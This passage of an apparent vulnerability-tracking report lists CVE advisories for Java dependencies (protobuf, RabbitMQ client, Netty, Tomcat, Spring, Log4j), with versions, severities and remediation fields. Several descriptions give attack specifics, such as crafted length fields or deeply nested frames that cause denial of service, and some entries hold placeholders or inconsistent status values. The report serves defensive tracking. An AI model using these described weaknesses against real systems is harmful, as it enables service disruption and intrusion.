- Fixed version: 3.16.3, 3.19.6, 3.20.3, 3.21.7
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

   ### CVE-2024-7254: Any project that parses untrusted Protocol Buffers data containing an arbitrary number of nested groups / series of SGROUP tags can corrupted by exceeding the stack limit i.e. StackOverflow. Parsing nested groups as unknown fields with DiscardUnknownFieldsParser or Java Protobuf Lite parser, or against Protobuf map fields, creates unbounded recursions that can be abused by an attacker.
          
- Package: com.google.protobuf:protobuf-java
- Severity: HIGH
- Installed version: 3.11.4
- Fixed version: 3.25.5, 4.27.5, 4.28.2
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2022-3171: A parsing issue with binary data in protobuf-java core and lite versions prior to 3.21.7, 3.20.3, 3.19.6 and 3.16.3 can lead to a denial of service attack. Inputs containing multiple instances of non-repeated embedded messages with repeated or unknown fields causes objects to be converted back-n-forth between mutable and immutable forms, resulting in potentially long garbage collection pauses. We recommend updating to the versions mentioned above.
          
- Package: com.google.protobuf:protobuf-java
- Severity: MEDIUM
- Installed version: 3.11.4
- Fixed version: 3.21.7, 3.20.3, 3.19.6, 3.16.3
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-63337: The RabbitMQ Java client library allows Java and JVM-based applications to connect to and interact with RabbitMQ nodes. Prior to 5.33.0, com.rabbitmq.tools.jsonrpc.ProcedureDescription receives a javaReturnType value in an untrusted system.describe response and passes it through JSONUtil.tryFill, setJavaReturnType, and computeReturnTypeAsJavaClass to Class.forName(javaReturnType) with initialization enabled. An attacker able to answer the JsonRpcClient request through a shared broker or network interception can select a class already present in the victim JVM and trigger its static initializer, while JsonRpcClient.java later passes getReturnType output to mapper.parse and may also create type confusion. Successful exploitation can affect confidentiality, integrity, and availability in the client process. This issue is fixed in version 5.33.0.
          
- Package: com.rabbitmq:amqp-client
- Severity: HIGH
- Installed version: 5.25.0
- Fixed version: 5.33.0
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-69219: The RabbitMQ Java client library allows Java and JVM-based applications to connect to and interact with RabbitMQ nodes. Prior to 5.33.1, src/main/java/com/rabbitmq/client/impl/ValueReader.java uses ValueReader.readBytes to accept a wire-declared contentLength below Integer.MAX_VALUE and allocate a byte array before checking the bytes available in the frame. A malicious AMQP peer can send a LongString or byte-array field with type tag S and a declared length such as 0x7FFFFFFE during the pre-authentication connection.start server-properties table, causing an approximately 2 GB allocation and OutOfMemoryError before readFully consumes data. The resulting memory exhaustion can terminate the JVM and cause denial of service. This issue is fixed in version 5.33.1.
          
- Package: com.rabbitmq:amqp-client
- Severity: HIGH
- Installed version: 5.25.0
- Fixed version: 5.33.1
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed 
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-69220: The RabbitMQ Java client library allows Java and JVM-based applications to connect to and interact with RabbitMQ nodes. Prior to 5.33.1, src/main/java/com/rabbitmq/client/impl/ValueReader.java permits ValueReader.readTable and ValueReader.readArray to call ValueReader.readFieldValue recursively for AMQP table type F and AMQP array type A values without a nesting-depth limit. A malicious AMQP server or network intermediary can send approximately 580 nested table levels in the pre-authentication connection.start frame, fitting within the default 131072-byte frame maximum, to trigger StackOverflowError. The error terminates the client input processing thread and causes denial of service. This issue is fixed in version 5.33.1.
          
- Package: com.rabbitmq:amqp-client
- Severity: HIGH
- Installed version: 5.25.0
- Fixed version: 5.33.1
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-63335: The RabbitMQ Java client library allows Java and JVM-based applications to connect to and interact with RabbitMQ nodes. Prior to 5.31.0, inbound AMQP command assembly in src/main/java/com/rabbitmq/client/impl/CommandAssembler.java processes a content-bearing method and header whose remainingBodyBytes value is smaller than a following AMQP.FRAME_BODY payload. CommandAssembler.consumeBodyFrame subtracts the peer-controlled payload length before validating that it fits, drives remainingBodyBytes negative, and throws a raw UnsupportedOperationException instead of MalformedFrameException. A malicious or compromised broker peer can send this malformed sequence on an open nonzero channel to terminate frame processing and close the client connection, causing denial of service for work using that connection. This issue is fixed in version 5.31.0.
          
- Package: com.rabbitmq:amqp-client
- Severity: MEDIUM
- Installed version: 5.25.0
- Fixed version: 5.31.0
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-63336: The RabbitMQ Java client library allows Java and JVM-based applications to connect to and interact with RabbitMQ nodes. Prior to 5.33.0, com.rabbitmq.client.ConnectionFactory.useSslProtocol() and ConnectionFactory.useSslProtocol(String) configure com.rabbitmq.client.TrustEverythingTrustManager and leave hostname verification disabled, causing arbitrary server certificates, including self-signed certificates, to be accepted. A network attacker able to intercept a TLS connection can impersonate the RabbitMQ broker, read protected AMQP traffic, and modify traffic without certificate or hostname validation. The fix changes the production TLS helpers to use the JVM default trust store and enables hostname verification, while retaining an explicitly named development-only no-verification helper. This issue is fixed in version 5.33.0.
          
- Package: com.rabbitmq:amqp-client
- Severity: MEDIUM
- Installed version: 5.25.0
- Fixed version: 5.33.0
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed 
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

 ### CVE-2026-61634: The RabbitMQ Java client library allows Java and JVM-based applications to connect to and interact with RabbitMQ nodes. Prior to 5.33.0, the AMQP connection tuning path records the negotiated AMQP frame_max value, but src/main/java/com/rabbitmq/client/impl/SocketFrameHandler.java and NettyFrameHandlerFactory continue to validate broker-controlled frame payload lengths against maxInboundMessageBodySize because the negotiated limit is not applied consistently through setMaxInboundFramePayloadSize. A malicious or compromised broker can send a method frame larger than the negotiated frame_max during or after connection establishment, causing the client to allocate and decode a protocol-invalid frame instead of rejecting it with MalformedFrameException. The protocol violation can disrupt the affected connection and cause client-side denial of service. This issue is fixed in version 5.33.0.
          
- Package: com.rabbitmq:amqp-client
- Severity: LOW
- Installed version: 5.25.0
- Fixed version: 5.33.0
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

### CVE-2026-40983: In Micrometer, it is possible for a user to provide specially crafted gRPC requests that may cause a denial-of-service (DoS) condition.\n\nAffected versions:\nMicrometer 1.16.0 through 1.16.5; 1.15.0 through 1.15.11.
          
- Package: io.micrometer:micrometer-core
- Severity: HIGH
- Installed version: 1.15.11
- Fixed version: 1.16.6, 1.15.12
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-40984: In Micrometer, it is possible for a user to provide specially crafted HTTP requests that may cause a denial-of-service (DoS) condition.\n\nAffected versions:\nmicrometer-core 1.16.0 through 1.16.5; 1.15.0 through 1.15.11; 1.14.0 through 1.14.15; 1.13.0 through 1.13.18; 1.9.0 through 1.9.17.\nmicrometer-jetty11 1.16.0 through 1.16.5; 1.15.0 through 1.15.11; 1.14.0 through 1.14.15; 1.13.0 through 1.13.18.\nmicrometer-jetty12 1.16.0 through 1.16.5; 1.15.0 through 1.15.11; 1.14.0 through 1.14.15; 1.13.0 through 1.13.18.
          
- Package: io.micrometer:micrometer-core
- Severity: HIGH
- Installed version: 1.15.11
- Fixed version: 1.16.6, 1.15.12
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-42583: Netty is an asynchronous, event-driven network application framework. Prior to 4.2.13.Final and 4.1.133.Final, Lz4FrameDecoder allocates a ByteBuf of size decompressedLength (up to 32 MB per block) before LZ4 runs. A peer only needs a 21-byte header plus compressedLength payload bytes - 22 bytes if compressedLength == 1 - to force that allocation. This vulnerability is fixed in 4.2.13.Final and 4.1.133.Final.
          
- Package: io.netty:netty-codec
- Severity: HIGH
- Installed version: 4.1.132.Final
- Fixed version: 4.1.133.Final
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-59901: Netty is an asynchronous, event-driven network application framework. Prior to versions 4.1.136.Final and 4.2.16.Final, the `Bzip2Decoder` handler in Netty's compression codec pipeline is vulnerable to a denial-of-service attack through a malformed bzip2 stream that permanently captures the event-loop thread in an infinite loop. The vulnerability exists in the run-length encoding (RLE) state machine within [`Bzip2BlockDecompressor.read()`]. This issue has been fixed in versions 4.1.136.Final and 4.2.16.Final.
          
- Package: io.netty:netty-codec
- Severity: HIGH
- Installed version: 4.1.132.Final
- Fixed version: 4.1.136.Final
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-44249: Netty is a network application framework for development of protocol servers and clients. In netty-handler prior to versions 4.1.135.Final and 4.2.15.Final, an attacker can bypass IPv6 subnet rules due to an incorrect masking operation in IpSubnetFilterRule.compareTo(). Valid public IP addresses can bypass the restrictions. Versions 4.1.135.Final and 4.2.15.Final patch the issue.
          
- Package: io.netty:netty-handler
- Severity: HIGH
- Installed version: 4.1.132.Final
- Fixed version: 4.2.15.Final, 4.1.135.Final
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-45416: Netty is a network application framework for development of protocol servers and clients. Prior to versions 4.1.135.Final and 4.2.15.Final, SslClientHelloHandler.decode() reads the 24-bit TLS handshake length and, when the ClientHello does not fit in the first record, eagerly allocates `ctx.alloc().buffer(handshakeLength)` (line 161). The guard at line 140 is `handshakeLength \u003e maxClientHelloLength \u0026\u0026 maxClientHelloLength != 0`, and the commonly-used SniHandler/AbstractSniHandler constructors (SniHandler(Mapping), SniHandler(AsyncMapping), AbstractSniHandler()) pass maxClientHelloLength=0 and handshakeTimeoutMillis=0, so the length guard is disabled and no timeout is scheduled. A 16 MiB request exceeds the default pooled chunk size and becomes a huge/unpooled allocation performed immediately. The buffer is retained in the handler until the channel closes. Versions 4.1.135.Final and 4.2.15.Final patch the issue.
          
- Package: io.netty:netty-handler
- Severity: HIGH
- Installed version: 4.1.132.Final
- Fixed version: 4.2.15.Final, 4.1.135.Final
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-50010: Netty is a network application framework for development of protocol servers and clients. Prior to versions 4.1.135.Final and 4.2.15.Final, SimpleTrustManagerFactory.engineGetTrustManagers() and related paths wrap any user-supplied plain X509TrustManager in X509TrustManagerWrapper, which extends X509ExtendedTrustManager but implements the 3-arg checkServerTrusted(chain, authType, SSLEngine) by discarding the SSLEngine and calling the 2-arg delegate. Because the object now IS an X509ExtendedTrustManager, neither SunJSSE's internal AbstractTrustManagerWrapper nor Netty's own OpenSslX509TrustManagerWrapper will re-wrap it to add endpoint-identification. Consequently, even though Netty 4.2 sets endpointIdentificationAlgorithm=\"HTTPS\" by default, a client built with `SslContextBuilder.forClient().trustManager(somePlainX509TrustManager)` performs no hostname verification at all. Versions 4.1.135.Final and 4.2.15.Final patch the issue.
          
- Package: io.netty:netty-handler
- Severity: HIGH
- Installed version: 4.1.132.Final
- Fixed version: 4.2.15.Final, 4.1.135.Final
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2023-22102: Vulnerability in the MySQL Connectors product of Oracle MySQL (component: Connector/J).  Supported versions that are affected are 8.1.0 and prior. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise MySQL Connectors.  Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in MySQL Connectors, attacks may significantly impact additional products (scope change). Successful attacks of this vulnerability can result in takeover of MySQL Connectors. CVSS 3.1 Base Score 8.3 (Confidentiality, Integrity and Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).
          
- Package: mysql:mysql-connector-java
- Severity: HIGH
- Installed version: 8.0.28
- Fixed version: none
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: affected
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

   ### CVE-2025-48924: Uncontrolled Recursion vulnerability in Apache Commons Lang.\n\nThis issue affects Apache Commons Lang: Starting with commons-lang:commons-lang 2.0 to 2.6, and, from org.apache.commons:commons-lang3 3.0 before 3.18.0.\n\nThe methods ClassUtils.getClass(...) can throw StackOverflowError on very long inputs. Because an Error is usually not handled by applications and libraries, a \nStackOverflowError could cause an application to stop.\n\nUsers are recommended to upgrade to version 3.18.0, which fixes the issue.
          
- Package: org.apache.commons:commons-lang3
- Severity: MEDIUM
- Installed version: 3.17.0
- Fixed version: 3.18.0
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-49844: Improper encoding of non-finite floating-point values during MapMessage JSON serialization in Apache Log4j API produces output that is not valid JSON. This issue affects Apache Log4j API versions 2.13.1 through 2.25.4 and version 2.26.0.\n\nThe fix for CVE-2026-34481 did not cover all code paths: when a MapMessage contains a non-finite IEEE 754 value (NaN, Infinity, or -Infinity), MapMessage.asJson() emits the corresponding bare token. RFC 8259 does not permit these tokens, so a conformant parser rejects the resulting document.\n\nThe defect is reachable only when both of the following conditions hold:\n\n  *  The application uses the  message resolver https://logging.apache.org/log4j/2.x/manual/json-template-layout.html#event-template-resolver-message  of JsonTemplateLayout or any other layout that relies on MapMessage.asJson() or MapMessage.getFormattedMessage(new String[]{\"JSON\"}).\n  *  The application logs a MapMessage that contains an attacker-controlled floating-point value.\n\n\nAn attacker who can supply a non-finite value can cause the affected layout to emit malformed JSON, which may corrupt the enclosing log record or disrupt downstream log ingestion and parsing.\n\nUsers are advised to upgrade to Apache Log4j API 2.25.5 or 2.26.1, both of which emit RFC 8259-compliant JSON for non-finite values.
          
- Package: org.apache.logging.log4j:log4j-api
- Severity: MEDIUM
- Installed version: 2.24.3
- Fixed version: 2.25.5, 2.26.1
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

   ### CVE-2026-41293: Improper Input Validation vulnerability in Apache Tomcat.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.21, from 10.1.0-M1 through 10.1.54, from 9.0.0.M1 through 9.0.117, from 10.0.0-M1 through 10.0.27.\nOlder, end of support versions may also be affected.\n\nUsers are recommended to upgrade to version [FIXED_VERSION], which fixes the issue.
          
- Package: org.apache.tomcat.embed:tomcat-embed-core
- Severity: CRITICAL
- Installed version: 10.1.54
- Fixed version: 9.0.118, 10.1.55, 11.0.22
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-43512: DEPRECATED: Authentication Bypass Issues vulnerability in digest authentication in Apache Tomcat.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.21, from 10.1.0-M1 through 10.1.54, from 9.0.0.M1 through 9.0.117, from 8.5.0 through 8.5.100, from before 7.0.0.\nOlder unsupported versions any also be affect\n\nUsers are recommended to upgrade to version 11.0.22, 10.1.55 or 9.0.118 which fix the issue.
          
- Package: org.apache.tomcat.embed:tomcat-embed-core
- Severity: CRITICAL
- Installed version: 10.1.54
- Fixed version: 9.0.118, 10.1.55, 11.0.22
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-43515: Improper Authorization vulnerability when multiple method constraints define an HTTP method for the same extension in Apache Tomcat.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.21, from 10.1.0-M1 through 10.1.54, from 9.0.0.M1 through 9.0.117, from 8.5.0 through 8.5.100, from 7.0.0 through 7.0.109.\n\nUsers are recommended to upgrade to version 11.0.22, 10.1.55 or 9.0.118 which fix the issue.
          
- Package: org.apache.tomcat.embed:tomcat-embed-core
- Severity: CRITICAL
- Installed version: 10.1.54
- Fixed version: 9.0.118, 10.1.55, 11.0.22
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-41284: Allocation of Resources Without Limits or Throttling vulnerability in Apache Tomcat.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.21, from 10.1.0-M1 through 10.1.54, from 9.0.0.M1 through 9.0.117.\nOlder, unsupported versions may also be affected.\n\nUsers are recommended to upgrade to version [FIXED_VERSION], which fixes the issue.
          
- Package: org.apache.tomcat.embed:tomcat-embed-core
- Severity: HIGH
- Installed version: 10.1.54
- Fixed version: 9.0.118, 10.1.55, 11.0.22
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

   ### CVE-2026-42498: Exposure of HTTP Authentication Header to unexpected hosts during WebSocket authentication vulnerability in Apache Tomcat.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.21, from 10.1.0-M1 through 10.1.54, from 9.0.2 through 9.0.117, from 8.5.24 through 8.5.100, from 7.0.83 through 7.0.109.\n\nUsers are recommended to upgrade to version 11.0.22, 10.1.55 or 9.0.118, which fix the issue.
          
- Package: org.apache.tomcat.embed:tomcat-embed-core
- Severity: HIGH
- Installed version: 10.1.54
- Fixed version: 9.0.118, 10.1.55, 11.0.22
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-43513: Improper Handling of Case Sensitivity vulnerability in LockOutRealm in Apache Tomcat.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.21, from 10.1.0-M1 through 10.1.54, from 9.0.0.M1 through 9.0.117, from 8.5.0 through 8.5.100, from 7.0.0 through 7.0.109.\nOlder unsupported versions may also be affected.\n\nUsers are recommended to upgrade to version 11.0.22, 10.1.55 or 9.0.118 which fix the issue.
          
- Package: org.apache.tomcat.embed:tomcat-embed-core
- Severity: HIGH
- Installed version: 10.1.54
- Fixed version: 9.0.118, 10.1.55, 11.0.22
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

   ### CVE-2026-43514: Observable Timing Discrepancy vulnerability when comparing AJP secret in Apache Tomcat.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.21, from 10.1.0-M1 through 10.1.54, from 9.0.0.M1 through 9.0.117, from 8.5.0 through 8.5.100, from 7.0.0 through 7.0.109.\nOlder unsupported versions may also be affected.\n\nUsers are recommended to upgrade to version 11.0.22, 10.1.55 or 9.0.118 which fix the issue.
          
- Package: org.apache.tomcat.embed:tomcat-embed-core
- Severity: LOW
- Installed version: 10.1.54
- Fixed version: 9.0.118, 10.1.55, 11.0.22
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-41701: Correlation IDs for replies in the RabbitTemplate.sendAndReceive() with the fixed reply queue are predictable due to internal simple counter.\n\nAffected versions:\nSpring AMQP 4.0.0 through 4.0.3; 3.2.0 through 3.2.10; 3.1.0 through 3.1.15; 2.4.0 through 2.4.17.
          
- Package: org.springframework.amqp:spring-amqp
- Severity: MEDIUM
- Installed version: 3.2.10
- Fixed version: 4.0.4, 3.2.11
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-41714: Applications that configure their broker connection via RabbitConnectionFactoryBean.setUri(\"amqps://...\") without also calling setUseSSL(true) get TLS encryption with no certificate validation and no hostname verification.\n\nAffected versions:\nSpring AMQP 4.0.0 through 4.0.3; 3.2.0 through 3.2.10; 3.1.0 through 3.1.15; 2.4.0 through 2.4.17.
          
- Package: org.springframework.amqp:spring-amqp
- Severity: MEDIUM
- Installed version: 3.2.10
- Fixed version: 4.0.4, 3.2.11
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-41001: Spring Boot's ArtemisEmbeddedConfigurationFactory uses a fixed, static path for the embedded Artemis message broker's data directory when no explicit path is configured. A local attacker on the same host can pre-create this predictable directory or place a symlink before the application starts.\n\nAffected versions:\nSpring Boot 4.0.0 through 4.0.6; 3.5.0 through 3.5.14; 3.4.0 through 3.4.16; 3.3.0 through 3.3.19; 2.7.0 through 2.7.33.
          
- Package: org.springframework.boot:spring-boot-autoconfigure
- Severity: MEDIUM
- Installed version: 3.5.14
- Fixed version: 4.0.7, 3.5.15
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-41695: Spring Data Commons applications may be vulnerable to denial of service through resource exhaustion when attacker-controlled property path strings are passed to MappingContext property path resolution.\n\nAffected versions:\nSpring Data Commons 4.0.0 through 4.0.5; 3.5.0 through 3.5.11; 3.4.0 through 3.4.14.
          
- Package: org.springframework.data:spring-data-commons
- Severity: HIGH
- Installed version: 3.5.11
- Fixed version: 4.0.6, 3.5.12
- Location:  Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: HIGH
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

  ### CVE-2026-41716: Spring Data's internal property-lookup cache accepts and permanently retains attacker-supplied strings as cache keys, allowing heap exhaustion through repeated requests.\n\nAffected versions:\nSpring Data Commons 2.7.0 through 2.7.19; 3.3.0 through 3.3.16; 3.4.0 through 3.4.14; 3.5.0 through 3.5.11; 4.0.0 through 4.0.5.
          
- Package: org.springframework.data:spring-data-commons
- Severity: HIGH
- Installed version: 3.5.11
- Fixed version: 4.0.6, 3.5.12
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

### CVE-2026-41711: Applications using Spring Data Commons may be vulnerable to a Denial of Service (DoS) attack leading to a StackOverflowException when parsing Sort parameters.\n\nAffected versions:\nSpring Data Commons 4.0.0 through 4.0.5; 3.5.0 through 3.5.11; 3.4.0 through 3.4.14; 3.3.0 through 3.3.16; 3.2.0 through 3.2.15; 3.1.0 through 3.1.14; 3.0.0 through 3.0.15; 2.7.0 through 2.7.19.
          
- Package: org.springframework.data:spring-data-commons
- Severity: MEDIUM
- Installed version: 3.5.11
- Fixed version: 4.0.6, 3.5.12
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

### CVE-2026-41721 : Spring Data Commons contains a vulnerability that can lead to a Denial of Service (DoS) condition if Spring Data Web Support is enabled in conjunction with a Controller method using @ProjectedPayload, when an attacker sends a specially crafted HTTP request that causes the application to allocate lots of memory.\n\nAffected versions:\nSpring Data Commons 4.0.0 through 4.0.5; 3.5.0 through 3.5.11; 3.4.0 through 3.4.14; 3.3.0 through 3.3.16; 3.2.0 through 3.2.15; 3.1.0 through 3.1.14; 3.0.0 through 3.0.15; 2.7.0 through 2.7.19.
          
- Package: org.springframework.data:spring-data-commons
- Severity: MEDIUM
- Installed version: 3.5.11
- Fixed version: 4.0.6, 3.5.12
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

### CVE-2026-41719: A SpEL Injection vulnerability exists in the Spring Data KeyValue if unsanitized user input is passed as Sort into a repository query method that delegates evaluation to the SpelPropertyComparator.\n\nAffected versions:\nSpring Data KeyValue / Spring Data Redis 4.0.0 through 4.0.5; 3.5.0 through 3.5.11; 3.4.0 through 3.4.14; 3.3.0 through 3.3.16; 3.2.0 through 3.2.15; 3.1.0 through 3.1.14; 3.0.0 through 3.0.15; 2.7.0 through 2.7.19.
          
- Package: org.springframework.data:spring-data-keyvalue
- Severity: MEDIUM
- Installed version: 3.5.11
- Fixed version: 4.0.6, 3.5.12
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

### CVE-2026-41710: An attacker can craft a large number of unique requests that trigger a failure, exhausting the capacity of the application-wide stateful retry cache. Once the cache is full, it permanently rejects any further updates, causing all later stateful retries and circuit breakers in the application to fail.\n\nAffected versions:\nSpring Retry 2.0.0 through 2.0.12; 1.3.0 through 1.3.4.
          
- Package: org.springframework.retry:spring-retry
- Severity: MEDIUM
- Installed version: 2.0.12
- Fixed version: 2.0.13
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

### CVE-2026-41706: Spring Security's CookieRequestCache and CookieServerRequestCache store the pre-authentication request URL in a browser cookie so that users can be redirected back to their intended destination after a successful login. In affected versions, the full absolute URL is stored in the cookie and is used without validation as the post-login redirect target.\n\nAffected versions:\nSpring Security 5.7.0 through 5.7.23; 5.8.0 through 5.8.25; 6.3.0 through 6.3.16; 6.4.0 through 6.4.16; 6.5.0 through 6.5.10; 7.0.0 through 7.0.5.
          
- Package: org.springframework.security:spring-security-web
- Severity: MEDIUM
- Installed version: 6.5.10
- Fixed version: 7.0.6, 6.5.11
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

### CVE-2026-47838: SubjectDnX509PrincipalExtractor does not correctly handle certain malformed X.509 certificate CN values, which can lead to reading the wrong value for the username. In a carefully crafted certificate, this can lead to an attacker impersonating another user.\n\nAffected versions:\nSpring Security 5.7.0 through 5.7.24; 5.8.0 through 5.8.26; 6.3.0 through 6.3.17; 6.4.0 through 6.4.17; 6.5.0 through 6.5.10.
          
- Package: org.springframework.security:spring-security-web
- Severity: MEDIUM
- Installed version: 6.5.10
- Fixed version: 6.5.11
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:


  ### CVE-2026-41848: Applications may be vulnerable to a Regular Expression Denial of Service (ReDoS) attack if an attacker is able to provide a pattern which is then directly or indirectly supplied to one of the following methods in AntPathMatcher: match(String pattern, String path), matchStart(String pattern, String path), extractUriTemplateVariables(String pattern, String path).\n\nAffected versions:\nSpring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.
          
- Package: org.springframework:spring-core
- Severity: LOW
- Installed version: 6.2.18
- Fixed version: 7.0.8, 6.2.19
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

### CVE-2026-41850: Applications that evaluate user-supplied Spring Expression Language (SpEL) expressions are vulnerable to an Algorithmic Denial of Service (DoS). By providing a specially crafted expression, an attacker can trigger excessive resource consumption during evaluation, leading to application degradation or unavailability.\n\nAffected versions:\nSpring Framework 7.0.0 through 7.0.7; 6.2.0 through 6.2.18; 6.1.0 through 6.1.27; 5.3.0 through 5.3.48.
          
- Package: org.springframework:spring-expression
- Severity: HIGH
- Installed version: 6.2.18
- Fixed version: 7.0.8, 6.2.19
- Location: Java application layer
- Exploitability: known
- Reachable at runtime: no
- Trivy Status: fixed
- Security Disposition: open
- Remediation: 
- Tracking issue: 
- Exception expiry: 
- Notes:

